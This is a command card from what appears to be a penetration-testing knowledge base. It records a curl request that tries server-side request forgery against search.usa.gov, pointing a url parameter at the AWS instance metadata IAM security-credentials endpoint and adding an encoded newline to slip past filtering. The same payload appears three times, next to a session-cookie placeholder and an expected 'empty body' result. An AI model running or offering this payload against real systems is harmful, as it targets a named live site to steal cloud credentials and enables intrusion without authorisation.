---
id: cmd-ssrf-aws-credentials
data: >-
  curl -X GET
  "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html"
  -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
tags:
  - ssrf
  - aws
  - metadata
type: command
output: 'HTTP/1.1 200 OK with empty body {"body":""}'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.653Z'
verified: false
validated: true
submitted: true
---
# ssrf-aws-iam-credentials-test

## Command

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
```

## Description

Tests SSRF access to existing AWS IAM metadata endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=...` | AWS metadata payload | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" [headers]
```

## Expected Output

200 OK empty body.

## Related

- [[commands/ssrf-aws-iam-credentialx-test]]
- [[procedures/Access-AWS-Metadata-Existing-Endpoint-via-SSRF]]
